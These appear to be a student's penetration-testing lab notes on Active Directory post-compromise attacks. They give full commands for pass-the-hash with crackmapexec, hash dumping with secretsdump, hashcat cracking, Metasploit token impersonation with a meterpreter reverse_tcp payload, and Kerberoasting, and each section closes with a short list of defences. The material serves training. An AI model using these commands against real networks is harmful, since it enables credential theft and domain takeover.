[*] Post-Compromise Attacks

[*] Pass The Hash/Pass The Password

[*] For This, We Are Going To Use A Tool: crackmapexec
[*] Installation:

apt-get install crackmapexec

[*] Attacking

[*] As We Know, We Have Comromised A Machines(fcastle:Password1), We Will Use It To Attck Further
[*] Command:

crackmapexec <DomainIP>/24 -u <UserName> -d <DomainName>.local -p <Password>
crackmapexec 192.168.57.0.24 -u fcastle -d MARVEL.local -p Password1

[*] As We Can See In The Output, We Compromised Another Machine With The Same Password
[*] Lets Try To Login Using psexec.py. Success! 

[*] Lets Dump Hashes Using secretsdump.py

https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py

[*] Command:

secretsdump.py <DomainName>/<Username>:<Password>@<VictimIp>

secretsdump.py marvel/fcastle:Password1@192.168.57.141

[*] Got The Hashes! Lets Try With The Other Machine That We Accessed Using Pass The Hash

secretsdump.py marvel/fcastle:Password1@192.168.57.142

[*] Got The Hashes For This Machine Too!

[*] Cracking The Hashes(Using Hashcat)

[*] Earlier, We Cracked NTLMv2 Hash But Now, It's NTML
[*] Command(On The Host)

hashcat.exe -m 1000 <HashFile.txt> <PathToRockyou.txt> -O

[*] Got Password For Both The Users(Earier, We Got Both Machines) But We Couldnt Crack The Administrator Password(Cause Likely It Is Disabled)

[*] Pass The Hash

[*] A Typical NTLM Hash

bill:FA91C4FD28A2D257AAD3B435B51404EE:FF2A43841C84518A18795AB6E3C8A62E:::

[*] Here We Only Need The Second Part

<User>:<Part1>:<Part2>:::

[*] Passing:

crackmapexec <IPRange>/24  -u "<User>" -H <HashPart2> --local
crackmapexec 192.168.57.0/24 -u "Frank Castle" -H FF2A43841C84518A18795AB6E3C8A62E --local

[*] Unsuccessful But No Problem. 

[*] Pass Attack Defences

[+] Limit Account Reuse
[+] Utilize Strong Password(>14 Characters)
[+] Privilage Access Management

[*] Token Impersonation

[*] Token = A Temporary Key That Allows Access To A System/Network

[*] Types:

[*] Delegate
[*] Impersonate

[*] Attacking:

[*] In Order To Perform This Attack, We Need Metasploit
[*] Now, Here We Will Use Psexec(In Metaspoloit) To Connect

use exploit/windows/smb/psexec

[*] Now In The Payload, We Need A Meterpreter Payload. 

set payload windows/x64/meterpreter/reverse_tcp

[*] Now:

exploit

[*] Got A Shell!(If Not, Disable Antivirus On The User Machine)
[*] Now We Have To Load A Tool

load incognito

[*] Now, The Commands. 
[*] First, Lets List Tokens

list_tokens -u

[*] Impersonating:

impersonate_token <Domain>\\<User>

impersonate_token marvel\\administrator

[*] We Are Administrator!
[*] If You Face Issues With Running Commands As Administrator, Type rev2self. This We Reverse The Process. 
[*] If You Don't See A Token For Administrator, Login To The Machine As Administrator And Thats It! You Get The Token

[*] Token Impersonation Defences

[+] Limit User/Group Token Creation Permissions
[+] Account Tiering
[+] Local Admin Restriction

[*] Kerberoasting

[*] For This Attack, We Will Use A Tool Called GetUserSPNs

https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py

[*] Command:

GetUserSPNs.py <DomainName>.local/<User>:<Password> -dc-ip <DomainControllerIP> -request
GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request4

[*] We Should Immediately Get The Hash! Copy It And Lets Crack It Using Hashcat(On The Host):

hashcat.exe -m 13100 <HashFile.txt> <PathToWordlist.txt> -O

[*] Here We Go! We Got The Password For The SQLService(It Is Domain Admin Account!)

[*] Defences:

[+] Strong Password
[+] Least Privilage(Don't Make Service Accounts Domain Admin)

[*] 